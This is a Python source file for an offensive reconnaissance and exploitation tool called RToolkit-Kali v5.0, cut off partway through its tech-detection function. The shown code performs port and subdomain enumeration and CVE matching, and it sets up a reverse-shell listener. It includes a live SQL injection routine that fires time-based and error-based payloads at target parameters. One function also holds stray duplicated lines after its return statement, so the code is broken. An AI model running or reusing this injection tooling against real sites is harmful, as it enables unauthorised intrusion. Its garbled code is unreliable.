#!/usr/bin/env python3
"""
RToolkit-Kali v5.0 — OVERPOWERED RED TEAM TOOL
Improvements over v4.0:
  - Streaming command output (SSH keepalive terjamin)
  - Config file support (~/.rtoolkit/config.json)
  - Concurrent phase execution (nmap + subdomain parallel)
  - Smarter nmap: single combined scan, no double scan
  - Progress timing per phase
  - Auto tmux detection + SSH keepalive check
  - Better error handling (no more bare except:pass)
  - Resume capability (skip completed phases)
  - v5.0: NVD API live CVE data with caching
  - v5.0: Searchsploit integration (exploit availability check)
  - v5.0: Confidence scoring (CONFIRMED/SUSPECTED/THEORETICAL)
  - v5.0: Validation loop for CRITICAL findings
  - v5.0: Attack Path Generator (chaining analysis)

Pipeline:
  1. nmap port scan → service detection → CVE match
  2. subfinder + crt.sh → subdomain discovery
  3. httpx probe → live hosts → whatweb tech detection
  4. dirsearch/ffuf → directory enumeration
  5. paramspider/arjun/x8 → parameter discovery
  6. nuclei/nikto/wpscan/sqlmap → vulnerability scan
  7. NVD API → live CVE matching + CVSS scoring
  8. searchsploit → exploit availability check
  9. Validation loop → confirm critical findings
  10. Attack Path Generator → chained exploit paths
  11. Database exploitation (PostgreSQL/MySQL/MSSQL)
  12. Reverse shell + exploit commands + reporting
"""
import os, sys, json, socket, ssl, subprocess, datetime, re, shutil, time, struct, concurrent.futures, threading
from pathlib import Path
from urllib.parse import urlparse, quote, urljoin
# v5.0: Optional modules (graceful degradation)
try:
    from nvd_client import NvdCache, query_nvd, merge_nvd_results, version_to_cves_with_nvd
    HAS_NVD = True
except ImportError:
    HAS_NVD = False
try:
    from exploit_client import check_exploit_available, batch_exploit_check
    HAS_EXPLOIT_CLIENT = True
except ImportError:
    HAS_EXPLOIT_CLIENT = False

# colorama — cross-platform ANSI color
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; B = Fore.BLUE
    C = Fore.CYAN; M = Fore.MAGENTA; W = Fore.WHITE; N = Style.RESET_ALL
    DIM = Style.DIM; BOLD = Style.BRIGHT
except ImportError:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
    C = "\033[96m"; M = "\033[95m"; W = "\033[97m"; N = "\033[0m"
    DIM = "\033[2m"; BOLD = "\033[1m"

HAS_REQUESTS = False
try:
    import requests; import urllib3; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning); HAS_REQUESTS = True
except ImportError:
    pass

RESULTS_DIR = Path("kali_results")
NVD_GLOBAL_CACHE = None  # v5.0: set in main(), read in version_to_cves_v5
CVE_DB = {}
cve_path = Path(__file__).parent / "cve_data.json"
if cve_path.exists():
    try:
        CVE_DB = json.loads(cve_path.read_text(encoding='utf-8'))
    except (json.JSONDecodeError, OSError):
        pass

REPORT = {"target":"","timestamp":"","ips":[],"ports":[],"services":[],"cves":[],
    "subdomains":[],"live_urls":[],"technologies":[],"directories":[],"parameters":[],
    "vulnerabilities":[],"exploit_commands":[],"phase_times":{},
    "dns_records":[],"http_headers":{},"wp_plugins":[],"wp_themes":[],"cascade":{},
    "cve_sources":{"local_db":0,"nvd_api":0,"hardcoded":0},
    "cve_confidence":{"confirmed":0,"suspected":0,"theoretical":0},
    "exploit_available_count":0,"nvd_cache_fresh":False,"nvd_cache_date":"",
    "attack_paths":[],"validation_results":{"total_checked":0,"confirmed":0,"downgraded":0},
    "summary":{"total":0,"critical":0,"high":0,"medium":0,"low":0,"info":0}}

CONFIG = {}
config_path = Path.home() / ".rtoolkit" / "config.json"
if config_path.exists():
    try:
        CONFIG = json.loads(config_path.read_text(encoding='utf-8'))
    except (json.JSONDecodeError, OSError):
        pass

def c(text, color):
    return f"{color}{text}{N}"

SEV_COLORS = {"CRITICAL":R,"HIGH":R,"MEDIUM":Y,"LOW":B,"INFO":C}
RED = R; GREEN = G; YELLOW = Y; CYAN = C; WHITE = W; MAGENTA = M; RESET = N

def cfg(key, default=None):
    return CONFIG.get(key, default)

# ====== CONFIG ======
# Auto-create config if not exists
if not config_path.exists():
    try:
        CONFIG = {
            "lhost": "YOUR_IP",
            "lport": 4444,
            "threads": 100,
            "dirsearch_wordlist": "/usr/share/wordlists/dirb/common.txt",
            "ffuf_wordlist": "/usr/share/wordlists/dirb/common.txt",
            "nmap_timeout": 600,
            "subfinder_timeout": 120,
            "nuclei_timeout": 300,
            "nikto_timeout": 300,
            "sqlmap_timeout": 180,
            "skip_phases": [],
            "nmap_full_scan": False,
            # v5.0: NVD API settings
            "nvd_api_key": "",
            "nvd_cache_days": 1,
            "nvd_max_results": 20,
            "enable_nvd_live": True,
            "enable_exploit_check": True,
            "enable_validation": True,
            "enable_attack_paths": True,
            "confidence_threshold": "SUSPECTED",
            "validate_critical_only": True,
        }
        config_path.parent.mkdir(parents=True, exist_ok=True)
        config_path.write_text(json.dumps(CONFIG, indent=2), encoding='utf-8')
    except OSError:
        pass

# ====== V5.0: VERSION NORMALIZATION & SEMVER ======
def normalize_version(raw_version):
    """Normalize version string: '2.4.38 (Debian)' -> '2.4.38', '9.6p1' -> '9.6', '8.1.30-1ubuntu1' -> '8.1.30'"""
    if not raw_version:
        return ""
    v = str(raw_version).strip()
    # Remove parenthesized suffixes: "2.4.38 (Debian)" -> "2.4.38"
    v = re.sub(r'\s*\([^)]*\)', '', v).strip()
    # Remove distro suffixes: "8.1.30-1ubuntu1" -> "8.1.30"
    # But preserve SSH-style p-suffix: "9.6p1" -> keep "9.6p1"
    if not re.search(r'\d+p\d+', v):
        v = re.sub(r'[.-][a-zA-Z]+\d+(?:\.\d+)*$', '', v).strip()
        v = re.sub(r'[.-]\d+[a-zA-Z]+\d*$', '', v).strip()
    # Remove trailing .0: "5.0" -> "5.0" (ok), but strip dangling dots
    v = v.strip('. ')
    return v

def version_in_range(detected, affected_start, affected_end=None):
    """Check if detected version falls within affected range. Supports semver-like comparisons."""
    try:
        from packaging.version import Version as _Ver, InvalidVersion
        def _parse(v):
            try:
                return _Ver(v)
            except InvalidVersion:
                return _Ver(re.sub(r'[^0-9.]', '', v) or '0')
        det = _parse(detected)
        if affected_start and _parse(affected_start) > det:
            return False
        if affected_end and _parse(affected_end) <= det:
            return False
        return True
    except ImportError:
        # Fallback: simple tuple comparison
        def _to_tuple(v):
            parts = re.findall(r'\d+', v)
            return tuple(int(p) for p in parts) if parts else (0,)
        det_t = _to_tuple(detected)
        if affected_start and _to_tuple(affected_start) > det_t:
            return False
        if affected_end and _to_tuple(affected_end) <= det_t:
            return False
        return True

def assign_confidence(cve_entry):
    """Assign confidence level based on source, version match, exploit availability, and validation status."""
    source = cve_entry.get("source", "local_db")
    version_match = cve_entry.get("version_match_type", "exact")
    exploit = cve_entry.get("exploit_available", False)
    validated = cve_entry.get("validated", False)

    # THEORETICAL: hardcoded or fuzzy matches
    if source == "hardcoded":
        return "THEORETICAL"
    if version_match == "fuzzy":
        return "THEORETICAL"

    # CONFIRMED: NVD exact match + validated, or NVD exact + exploit available
    if source == "nvd_api":
        if version_match == "exact":
            if validated:
                return "CONFIRMED"
            if exploit:
                return "CONFIRMED"
            return "SUSPECTED"
        if version_match == "range":
            if exploit and validated:
                return "CONFIRMED"
            return "SUSPECTED"

    # Local DB exact match
    if source == "local_db":
        if version_match == "exact":
            if validated:
                return "CONFIRMED"
            if exploit:
                return "SUSPECTED"
            return "SUSPECTED"
        return "THEORETICAL"

    return "THEORETICAL"

def version_to_cves_v5(service_name, version, cve_db=None):
    """Enhanced CVE matching: local DB (exact + semver) + NVD API via global cache."""
    matches = []
    if not version:
        return matches
    db = cve_db if cve_db is not None else CVE_DB
    db_key = service_name.lower().replace(' ', '').replace('-', '')
    if db_key not in db:
        return matches
    norm_ver = normalize_version(version)
    if not norm_ver:
        return matches

    # 1. Try exact match first (fast path, backward compatible)
    if norm_ver in db[db_key]:
        for vuln in db[db_key][norm_ver]:
            matches.append({"cve": vuln, "source": "local_db", "version_match_type": "exact"})

    # 2. Try semver range match against all versions in DB
    existing_ids = {m["cve"] for m in matches}
    for db_ver, vulns in db[db_key].items():
        if db_ver == norm_ver:
            continue
        if version_in_range(norm_ver, db_ver, None):
            for vuln in vulns:
                if vuln not in existing_ids:
                    matches.append({"cve": vuln, "source": "local_db", "version_match_type": "range"})
                    existing_ids.add(vuln)

    # 3. NVD API fallback via global cache
    if HAS_NVD and cfg("enable_nvd_live", True) and NVD_GLOBAL_CACHE is not None:
        nvd_cves = query_nvd(db_key, norm_ver, NVD_GLOBAL_CACHE,
                             cfg("nvd_api_key", ""), cfg("nvd_cache_days", 1))
        for nvd in nvd_cves:
            cve_id = nvd.get("cve_id", "")
            if cve_id and cve_id not in existing_ids:
                matches.append({
                    "cve": cve_id, "source": "nvd_api",
                    "cvss_score": nvd.get("cvss_score"),
                    "version_match_type": "nvd_range",
                    "description": nvd.get("description", ""),
                })
                existing_ids.add(cve_id)

    return matches
                    matches.append({"cve": vuln, "source": "local_db", "version_match_type": "range"})

    return matches

CONFIDENCE_LEVELS = ["CONFIRMED", "SUSPECTED", "THEORETICAL"]

# ====== VALIDATION LOOP (v5.0) ======
def validate_critical_finding(cve_entry, target_domain):
    """Re-probe the target to confirm a CRITICAL CVE. Returns enriched dict with validated flag."""
    validated = dict(cve_entry)
    software = validated.get("software", "").lower()
    version = validated.get("version", "")
    cve_id = validated.get("cve", "")
    sw_type = validated.get("service", "").lower()

    # Skip validation for THEORETICAL findings
    if validated.get("confidence") == "THEORETICAL":
        validated["validated"] = False
        validated["validation_note"] = "THEORETICAL — requires version confirmation"
        return validated

    # Web server validation: re-fetch headers
    if any(w in software for w in ["apache", "nginx", "iis", "php", "wordpress", "joomla", "drupal"]):
        for url in [f"https://{target_domain}", f"http://{target_domain}"]:
            try:
                import requests
                r = requests.get(url, timeout=5, verify=False,
                               headers={"User-Agent": "Mozilla/5.0"})
                server = r.headers.get("Server", "")
                powered = r.headers.get("X-Powered-By", "")
                body = r.text
                body_low = body.lower()

                if "apache" in software and server:
                    m = re.search(r'Apache[ /](\d+\.\d+(?:\.\d+)?)', server, re.I)
                    if m and normalize_version(m.group(1)) == normalize_version(version):
                        validated["validated"] = True
                        validated["validation_note"] = f"Confirmed: server header shows {m.group(1)}"
                        break
                elif "nginx" in software and server:
                    m = re.search(r'nginx[ /]?(\d+\.\d+(?:\.\d+)?)', server, re.I)
                    if m and normalize_version(m.group(1)) == normalize_version(version):
                        validated["validated"] = True
                        validated["validation_note"] = f"Confirmed: server header shows {m.group(1)}"
                        break
                elif "php" in software and powered:
                    m = re.search(r'PHP[ /](\d+\.\d+(?:\.\d+)?)', powered, re.I)
                    if m and normalize_version(m.group(1)) == normalize_version(version):
                        validated["validated"] = True
                        validated["validation_note"] = f"Confirmed: X-Powered-By shows {m.group(1)}"
                        break
                elif "wordpress" in software:
                    m = re.search(r'<meta name="generator"[^>]*content="WordPress (\d+\.\d+(?:\.\d+)?)"', body, re.I)
                    if m and normalize_version(m.group(1)) == normalize_version(version):
                        validated["validated"] = True
                        validated["validation_note"] = f"Confirmed: WordPress generator meta shows {m.group(1)}"
                        break
            except Exception:
                continue

    # SSH validation: re-probe banner
    if "openssh" in software:
        try:
            s = socket.socket(); s.settimeout(4)
            s.connect((target_domain, 22))
            banner = s.recv(1024).decode('utf-8', errors='replace').strip()
            s.close()
            m = re.search(r'SSH-\d+\.\d+-([^\s]+)', banner)
            if m and normalize_version(m.group(1)) == normalize_version(version):
                validated["validated"] = True
                validated["validation_note"] = f"Confirmed: SSH banner shows {m.group(1)}"
        except Exception:
            pass

    # If not validated, mark with note
    if not validated.get("validated"):
        validated["validated"] = False
        validated["validation_note"] = "Could not re-confirm version via live probe"
        # Downgrade confidence for unvalidated critical findings
        if validated.get("confidence") == "CONFIRMED":
            validated["confidence"] = "SUSPECTED"

    return validated


def validate_all_critical(cve_entries, target_domain, max_workers=5, critical_only=True):
    """Thread-pooled validation of critical findings. Returns enriched CVE list."""
    if not cve_entries:
        return []
    to_validate = []
    for cv in cve_entries:
        if critical_only and cv.get("severity") not in ["CRITICAL", "HIGH"]:
            continue
        if cv.get("confidence") == "THEORETICAL":
            continue
        if cv.get("validated"):
            continue  # skip already validated
        to_validate.append(cv)

    if not to_validate:
        return cve_entries

    print(f"  {c(f'[Validation] Re-checking {len(to_validate)} findings...',C)}")
    validated_map = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = {ex.submit(validate_critical_finding, cv, target_domain): cv for cv in to_validate}
        done_count = 0
        for future in concurrent.futures.as_completed(futures):
            done_count += 1
            try:
                result = future.result()
                validated_map[result.get("cve", "")] = result
            except Exception as e:
                pass

    # Merge validated results back
    enriched = []
    confirmed = 0
    downgraded = 0
    for cv in cve_entries:
        cid = cv.get("cve", "")
        if cid in validated_map:
            enriched.append(validated_map[cid])
            if validated_map[cid].get("validated"):
                confirmed += 1
            else:
                downgraded += 1
        else:
            enriched.append(cv)

    REPORT["validation_results"]["total_checked"] += len(to_validate)
    REPORT["validation_results"]["confirmed"] += confirmed
    REPORT["validation_results"]["downgraded"] += downgraded
    print(f"    {c(f'Validation: {confirmed} confirmed, {downgraded} downgraded',G if confirmed > downgraded else Y)}")
    return enriched

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{R}
╔══════════════════════════════════════════════════════════════╗
║{W}  ██████╗ ████████╗ ██████╗  ██████╗ ██╗  ██╗██╗     ██╗████████╗{R} ║
║{W}  ██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║ ██╔╝██║     ██║╚══██╔══╝{R} ║
║{W}  ██████╔╝   ██║   ██║   ██║██║   ██║█████╔╝ ██║     ██║   ██║   {R} ║
║{W}  ██╔══██╗   ██║   ██║   ██║██║   ██║██╔═██╗ ██║     ██║   ██║   {R} ║
║{W}  ██║  ██║   ██║   ╚██████╔╝╚██████╔╝██║  ██╗███████╗██║   ██║   {R} ║
║{W}  ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   {R} ║
║{Y}  v5.0 — Overpowered Pipeline: nmap+subfinder+nvd_api+searchsploit+attack_paths{R} ║
╚══════════════════════════════════════════════════════════════╝{N}""")

# ====== TIMER DECORATOR ======
phase_times = {}

def timer(func):
    def wrapper(*args, **kwargs):
        start = time.time()
        result = func(*args, **kwargs)
        elapsed = time.time() - start
        phase_times[func.__name__] = elapsed
        print(f"  {c(f'  ({int(elapsed)}s)',DIM)}")
        return result
    return wrapper

# ====== STREAMING run_cmd (FIXES SSH DISCONNECT) ======
def run_cmd_stream(cmd, timeout=120, desc="", silent=False):
    """Run command with real-time stdout printing — SSH keepalive terjamin."""
    if desc and not silent:
        print(f"    {c('→ '+desc,C)}")
    stdout_lines = []
    try:
        proc = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        start_time = time.time()
        deadline = start_time + timeout
        last_tick = start_time
        line_count = 0
        for line in iter(proc.stdout.readline, ''):
            now = time.time()
            if now > deadline:
                proc.kill()
                if not silent:
                    print(f"    {c(f'[TIMEOUT after {timeout}s]',R)}")
                return "\n".join(stdout_lines), "TIMEOUT", False
            if line:
                stdout_lines.append(line.rstrip())
                line_count += 1
                elapsed = int(now - start_time)
                if line_count <= 10 or (elapsed % 10 == 0 and now - last_tick >= 8):
                    if not silent:
                        print(f"    [{elapsed}s] {line.rstrip()[:120]}")
                    last_tick = now
        proc.wait()
        ok = proc.returncode == 0
        if not silent and len(stdout_lines) > 10:
            print(f"    {c(f'✓ Selesai — {len(stdout_lines)} baris output dalam {int(time.time()-start_time)} detik',DIM)}")
        return "\n".join(stdout_lines), "", ok
    except Exception as e:
        if not silent:
            print(f"    {c(f'[ERROR] {e}',R)}")
        return "", str(e), False

def run_cmd(cmd, timeout=120, desc="", silent=False):
    """Silent run (capture only, no output)."""
    if desc and not silent:
        print(f"    {c('→ '+desc,C)}")
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return proc.stdout, proc.stderr, proc.returncode == 0
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", False
    except Exception as e:
        return "", str(e), False

def check_tmux():
    """Check if running inside tmux, offer if not."""
    if os.environ.get('TMUX'):
        return True
    if os.environ.get('TERM_PROGRAM') == 'tmux':
        return True
    print(f"\n  {c('[!] NOT running inside tmux',Y)}")
    print(f"  {c('    Kalau SSH disconnect, process akan mati.',Y)}")
    print(f"  {c('    Recommended: tmux new -s redteam && python3 rtoolkit-kali.py',C)}")
    return False

def check_ssh_keepalive():
    """Check if SSH keepalive is configured."""
    try:
        result = subprocess.run(
            "sshd -T 2>/dev/null | grep -i 'clientaliveinterval'",
            shell=True, capture_output=True, text=True, timeout=3
        )
        if result.stdout.strip():
            print(f"  {c('SSH keepalive:',G)} {result.stdout.strip()}")
        else:
            print(f"  {c('SSH keepalive:',Y)} not configured — run fix-ssh-dc.sh")
    except Exception:
        pass

# ====== TIMING HELPERS ======
def print_status(phase_label, start_time):
    elapsed = time.time() - start_time
    print(f"    {c(f'  ({int(elapsed)}s elapsed)',DIM)}")

# ====== DNS LOOKUP (from rtoolkit.py) ======
def dns_lookup(domain):
    results = {"a":[],"aaaa":[],"mx":[],"ns":[],"txt":[],"cname":[]}
    try:
        ip = socket.gethostbyname(domain)
        results["a"].append(ip)
    except Exception:
        pass
    return results

def print_dns_table(results):
    rows = []
    for rtype, records in results.items():
        for r in records:
            rows.append([rtype.upper(), r])
    if rows:
        print_table(["Type","Record"], rows[:15], "[DNS RECORDS]")

# ====== PARAM EXTRACTION (from rtoolkit.py) ======
COMMON_PARAMS = ["id","page","q","s","search","cat","category","lang",
    "file","f","path","dir","action","mod","option","controller",
    "cmd","exec","run","do","sort","order","limit","offset",
    "start","page_id","post_id","user_id","uid","pid","bid",
    "token","key","api_key","apikey","secret","auth","password",
    "pass","pwd","email","mail","username","user","login",
    "redirect","url","link","return","ret","next","goto",
    "referer","ref","callback","format","type","mode",
    "debug","test","preview","view","show","edit","delete",
    "remove","add","create","update","save","submit",
    "download","upload","import","export","print",
    "method","_method","route","r","c","m","a","ajax",
    "data","json","xml","raw","_","nonce","csrf","_token",
    "state","status","msg","message","error","success",
    "width","height","size","w","h","cb","timestamp","t",
    "sig","signature","hash","hmac","code","ref_code",
    "campaign","source","medium","term","content",
    "gclid","fbclid","utm_source","utm_medium","utm_campaign",
]

def param_extract(url):
    params = set()
    if not HAS_REQUESTS:
        return list(params)
    try:
        r = requests.get(url, timeout=5, verify=False)
        forms = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', r.text, re.I)
        params.update(forms)
        query = re.findall(r'\?([^"\'\s]+)', r.text)
        for q in query:
            for p in q.split('&'):
                if '=' in p:
                    params.add(p.split('=')[0])
        parsed = urlparse(url)
        if parsed.query:
            for pair in parsed.query.split('&'):
                if '=' in pair:
                    params.add(pair.split('=')[0])
    except Exception:
        pass
    return list(params)

# ====== PRINT TABLE ======
def print_table(headers, rows, title=None):
    if not rows:
        return
    col_widths = [len(h)+2 for h in headers]
    for row in rows:
        for i, cell in enumerate(row):
            clean = re.sub(r'\x1b\[[0-9;]*m', '', str(cell))
            col_widths[i] = max(col_widths[i], len(clean)+2)
    sep = '+' + '+'.join('─'*w for w in col_widths) + '+'
    if title:
        print(f"\n  {c(title,C)}")
    print(f"  {c(sep,DIM)}")
    hdr = ' │ '.join(h.center(col_widths[i]) for i, h in enumerate(headers))
    print(f"  {c('│',DIM)} {hdr} {c('│',DIM)}")
    print(f"  {c(sep,DIM)}")
    for row in rows:
        cells = []
        for i, cell in enumerate(row):
            clean = re.sub(r'\x1b\[[0-9;]*m', '', str(cell))
            pad = col_widths[i] - len(clean) - 2
            cells.append(str(cell)+' '*pad)
        print(f"  {c('│',DIM)} {' │ '.join(cells)} {c('│',DIM)}")
    print(f"  {c(sep,DIM)}")

# ====== CVE ENGINE ======
def version_to_cves(service_name, version):
    """Legacy wrapper — convert to CVE IDs only for backward compatibility."""
    results = version_to_cves_v5(service_name, version)
    return [r["cve"] for r in results]

def risk_level(cve_text, cvss_score=None):
    """Determine severity from CVE text or CVSS score. Higher precision with CVSS."""
    # If CVSS score provided, use it directly
    if cvss_score is not None:
        try:
            score = float(cvss_score)
            if score >= 9.0: return "CRITICAL"
            if score >= 7.0: return "HIGH"
            if score >= 4.0: return "MEDIUM"
            if score >= 0.1: return "LOW"
            return "INFO"
        except (ValueError, TypeError):
            pass
    # Fallback: keyword-based heuristic
    t = cve_text.lower()
    if any(w in t for w in ['rce','critical','remote code','buffer overrun','code injection','heap overflow']):
        return "CRITICAL"
    if any(w in t for w in ['high','privesc','privilege escalation','ssrf','traversal','memory corruption','xss']):
        return "HIGH"
    if any(w in t for w in ['medium','dos','info leak','spoof','bypass']):
        return "MEDIUM"
    return "LOW"

def add_cve(port, svc, software, version, cve_text, confidence="SUSPECTED", source="local_db",
            cvss_score=None, exploit_available=False, exploit_edb_id=None, exploit_path=None,
            validated=False, version_match_type="exact"):
    """Add CVE to report with full metadata. Overloaded for backward compatibility."""
    sev = risk_level(cve_text, cvss_score)
    conf = assign_confidence({
        "source": source, "version_match_type": version_match_type,
        "exploit_available": exploit_available, "validated": validated
    })
    # Override confidence if explicitly set and stricter
    conf = confidence if confidence in ["CONFIRMED", "SUSPECTED", "THEORETICAL"] else conf
    if not any(cv['cve']==cve_text for cv in REPORT["cves"]):
        entry = {
            "port":port,"service":svc,"software":software,"version":version,
            "normalized_version":normalize_version(version) if version else "",
            "cve":cve_text,"severity":sev,
            "confidence":conf,"source":source,"cvss_score":cvss_score,
            "exploit_available":exploit_available,"exploit_edb_id":exploit_edb_id,
            "exploit_path":exploit_path,"validated":validated,
            "version_match_type":version_match_type
        }
        REPORT["cves"].append(entry)
        REPORT["summary"][sev.lower()] = REPORT["summary"].get(sev.lower(), 0) + 1
        REPORT["summary"]["total"] += 1
        REPORT["cve_sources"][source] = REPORT["cve_sources"].get(source, 0) + 1
        REPORT["cve_confidence"][conf.lower()] = REPORT["cve_confidence"].get(conf.lower(), 0) + 1
        if exploit_available:
            REPORT["exploit_available_count"] += 1

def add_cve_v5(port, svc, software, version, cve_result):
    """Add CVE entry from version_to_cves_v5 result dict. Accepts: {cve, source, version_match_type, cvss_score?}"""
    add_cve(
        port=port, svc=svc, software=software, version=version,
        cve_text=cve_result["cve"], source=cve_result.get("source","local_db"),
        version_match_type=cve_result.get("version_match_type","exact"),
        cvss_score=cve_result.get("cvss_score")
    )

# ====== PURE PYTHON SUBDOMAIN ENUM (from rtoolkit.py) ======
SUBDOMAIN_WORDLIST = ["www","mail","admin","blog","api","dev","test","stage",
    "vpn","remote","webmail","portal","cpanel","secure","forum",
    "support","shop","app","m","mobile","en","fr","de","it","pt",
    "ru","jp","cn","br","wiki","help","status","cdn","static",
    "media","img","css","js","download","upload","files","docs",
    "kb","faq","news","community","chat","web","smtp","imap","pop",
    "ftp","ssh","ldap","mysql","db","backup","proxy","gateway",
    "firewall","router","switch","dns","dhcp","ntp","syslog",
    "monitor","report","analytics","tracking","pixel","ad","ads",
    "partner","affiliate","whm","direct","go","redirect","mail2",
    "mail1","web1","web2","ns1","ns2","mx1","mx2","smtp2",
    "owa","autodiscover","msoid","lyncdiscover","sip","meet",
    "dialin","teams","skype","outlook","office","sharepoint",
    "onedrive","yammer","crm","dynamics","powerapps","flow",
    "forms","sway","stream","staff","hr","payroll","intranet",
    "extranet","vpn2","vpn3","remote2","rdp","citrix","horizon",
    "vmware","vcenter","esxi","vsphere","nsx","sso","saml",
    "adfs","sts","identity","login","signin","auth","oauth",
    "openid","accounts","profile","myaccount","my","dashboard",
    "panel","manager","admin2","administrator","superadmin",
    "demo","sandbox","dev2","dev3","staging","qa","uat",
    "preprod","prod","production","release","beta","alpha",
    "jenkins","jira","confluence","bitbucket","gitlab","github",
    "git","svn","trac","redmine","bugzilla","trello","slack",
    "teams","discord","mattermost","rocketchat","grafana",
    "kibana","elastic","logstash","splunk","kafka","zookeeper",
    "rabbitmq","activemq","redis","memcached","cassandra",
    "mongo","mongodb","mysql","postgres","pgsql","mariadb",
    "cockroach","influxdb","timescaledb","prometheus",
    "alertmanager","thanos","cortex","loki","tempo","jaeger",
    "zipkin","skywalking","datadog","newrelic","dynatrace",
    "appdynamics","instana","wavefront","signalfx","honeycomb",
    "sentry","rollbar","airbrake","bugsnag","papertrail",
    "loggly","sumologic","logentries","logdna","scalyr",
    "container","docker","k8s","kubernetes","kube","cluster",
    "node","worker","master","etcd","harbor","registry",
    "dockerhub","quay","artifact","nexus","artifactory",
    "sonar","sonarqube","codeclimate","coveralls","codacy",
    "codecov","circleci","travis","jenkins2","gitlabci",
    "teamcity","bamboo","buildkite","codeship","drone",
    "concourse","spinnaker","argo","flux","istio","linkerd",
    "envoy","haproxy","traefik","nginx","apache","caddy",
    "varnish","squid","proxy2","lb","loadbalancer",
    "waf","cloudflare","akamai","fastly","cloudfront",
    "cdn","edge","origin","static2","assets2","img2",
    "video","stream","live","tv","radio","podcast"]

def subdomain_enum(domain):
    results = []
    for sub in SUBDOMAIN_WORDLIST:
        fqdn = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            results.append({"subdomain": fqdn, "ip": ip})
        except:
            pass
    try:
        results.append({"subdomain": domain, "ip": socket.gethostbyname(domain)})
    except:
        pass
    return results

# ====== ENHANCED SQLI (from rtoolkit.py) ======
SQLI_ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual.*MySQL", r"Table '.*' doesn't exist",
        r"Unknown column '.*' in 'where clause'", r"You have an error in your SQL syntax",
        r"#1064", r"#1054", r"#1146", r"#1062", r"#2006", r"#2013",
        r"MySQL server version for the right syntax",
    ],
    "MSSQL": [
        r"Driver.*SQL Server", r"SQL Server.*Driver", r"Warning.*odbc_.*",
        r"Warning.*mssql_.*", r"Unclosed quotation mark", r"Microsoft OLE DB Provider for SQL Server",
        r"Microsoft ODBC SQL Server Driver", r"Line \d+", r"SQLServer JDBC Driver",
        r"com.microsoft.sqlserver", r"System.Data.SqlClient",
        r"Convert date", r"String or binary data would be truncated",
    ],
    "Oracle": [
        r"ORA-[0-9]{5}", r"Oracle driver", r"Oracle.*Driver", r"Warning.*oci_.*",
        r"Oracle JDBC Driver", r"oracle.jdbc", r"quoted string not properly terminated",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"PostgreSQL query failed",
        r"ERROR:.*PostgreSQL", r"pg_query", r"org.postgresql",
        r"PSQLException", r"invalid input syntax for type",
    ],
    "SQLite": [
        r"SQLite.*Error", r"Warning.*sqlite_.*", r"unrecognized token",
        r"no such column", r"no such table", r"SQLite3::",
    ],
}

def sqli_detect(url, params=None):
    findings = []
    if not HAS_REQUESTS:
        return findings
    if params is None:
        parsed_params = param_extract(url)
        params = parsed_params if parsed_params else COMMON_PARAMS[:20]
    for param in params[:10]:
        time_payload = "' OR SLEEP(3) -- -"
        test_url = url
        if '?' in url:
            test_url = re.sub(f'({re.escape(param)}=)[^&]*', f'\\1{quote(time_payload)}', url)
        else:
            test_url = f"{url}?{param}={quote(time_payload)}"
        try:
            start = time.time()
            r1 = requests.get(url, timeout=5, verify=False)
            base_time = time.time() - start
            start = time.time()
            r2 = requests.get(test_url, timeout=10, verify=False)
            attack_time = time.time() - start
            if attack_time - base_time > 2.5:
                findings.append({"type":"Time-Based SQLi","param":param,"payload":time_payload,
                    "severity":"CRITICAL","base_time":round(base_time,2),"response_time":round(attack_time,2)})
                continue
        except:
            pass
        for payload in ["'", "\"", "')", "' OR '1'='1", "' OR 1=1 -- -", "\" OR 1=1 -- -", "1' AND 1=0'"]:
            try:
                test_url = url
                if '?' in url:
                    test_url = re.sub(f'({re.escape(param)}=)[^&]*', f'\\1{quote(payload)}', url)
                else:
                    test_url = f"{url}?{param}={quote(payload)}"
                r = requests.get(test_url, timeout=5, verify=False)
                body = r.text
                for db, patterns in SQLI_ERROR_PATTERNS.items():
                    for pat in patterns:
                        if re.search(pat, body, re.I):
                            findings.append({"type":f"Error-Based SQLi ({db})","param":param,
                                "payload":payload,"severity":"CRITICAL","database":db})
                            break
                    else:
                        continue
                    break
            except:
                pass
    return findings

# ====== DEEP TECH DETECTION (from rtoolkit.py) ======
def detect_tech_version(url):
    techs = {}
    if not HAS_REQUESTS:
        return techs
    try:
        r = requests.get(url, timeout=5, verify=False, headers={'User-Agent':'Mozilla/5.0'})
        h = r.headers
        body = r.text
        server = h.get("Server", "")
        if server:
            techs["Server"] = server
            for soft in ["Apache","nginx","IIS","OpenSSL","PHP"]:
                m = re.search(rf'{re.escape(soft)}[ /](\d+\.\d+(?:\.\d+)?)', server, re.I)
                if m:
                    techs[f"{soft}_version"] = m.group(1)
        powered = h.get("X-Powered-By", "")
        if powered:
            techs["X-Powered-By"] = powered
            m = re.search(r'PHP[ /](\d+\.\d+(?:\.\d+)?)', powered, re.I)
            if m:
                techs["PHP_version"] = m.group(1)
            m = re.search(r'ASP\.NET[ /]?(\d+\.\d+(?:\.\d+)?)?', powered, re.I)
            if m and m.group(1):
                techs["ASP.NET_version"] = m.group(1)
        if "wp-content" in body or "wp-json" in body:
            techs["CMS"] = "WordPress"
            m = re.search(r'<meta name="generator"[^>]*content="WordPress (\d+\.\d+(?:\.\d+)?)"', body, re.I)
            if m:
                techs["WordPress_version"] = m.group(1)
            plugins = re.findall(r'wp-content/plugins/([^/]+)/', body)
            if plugins:
                techs["WP_Plugins"] = list(set(plugins))
            themes = re.findall(r'wp-content/themes/([^/]+)/', body)
            if themes:
